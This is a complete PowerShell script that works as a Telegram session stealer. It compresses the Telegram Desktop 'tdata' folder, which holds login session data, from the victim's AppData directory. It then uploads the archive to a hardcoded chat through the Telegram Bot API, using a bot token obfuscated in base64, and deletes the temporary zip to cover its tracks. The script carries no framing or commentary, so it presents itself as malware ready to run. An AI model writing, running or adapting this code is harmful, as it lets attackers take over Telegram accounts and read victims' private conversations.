# Define paths using environment variables
$src = Join-Path -Path $env:APPDATA -ChildPath "Telegram Desktop\tdata"
$zip = Join-Path -Path $env:TEMP -ChildPath "tdata_$(Get-Date -Format 'yyyyMMddHHmmss').zip"
$tent = "Nzk5Mzc1NTI1OTpBQUhQRUZSTFY1dmY1T1lvQnNRQjVlbnJSaXpSbC1hNFZKRQo="
$tentet = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tent))
$cht = "5047177665"

# Check if source directory exists
if (-not (Test-Path -Path $src -PathType Container)) {
    Write-Error "Source directory '$src' does not exist or is inaccessible."
    exit 1
}

# Check if the user has read access to the source directory
try {
    $testFile = Get-ChildItem -Path $src -ErrorAction Stop
} catch {
    Write-Error "Cannot access source directory '$src': $_"
    exit 1
}

# Create zip file in TEMP directory
try {
    # Ensure TEMP directory is writable
    if (-not (Test-Path -Path $env:TEMP -PathType Container)) {
        Write-Error "TEMP directory '$env:TEMP' is not accessible."
        exit 1
    }

    # Compress the tdata folder
    Compress-Archive -Path "$src\*" -DestinationPath $zip -Force -ErrorAction Stop
} catch {
    Write-Error "Failed to create zip file at '$zip': $_"
    exit 1
}

# Verify zip file was created
if (-not (Test-Path -Path $zip -PathType Leaf)) {
    Write-Error "Zip file '$zip' was not created."
    exit 1
}

# Send the zip file via Telegram Bot API
try {
    $uri = "https://api.telegram.org/bot$tentet/sendDocument"
    $form = @{
        chat_id = $cht
        document = Get-Item -Path $zip -ErrorAction Stop
    }
    Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction Stop
} catch {
    Write-Error "Failed to send file via Telegram API: $_"
    exit 1
} finally {
    # Clean up the zip file
    if (Test-Path -Path $zip) {
        Remove-Item -Path $zip -Force -ErrorAction SilentlyContinue
    }
}

Write-Output "File successfully sent and cleaned up."
exit 0
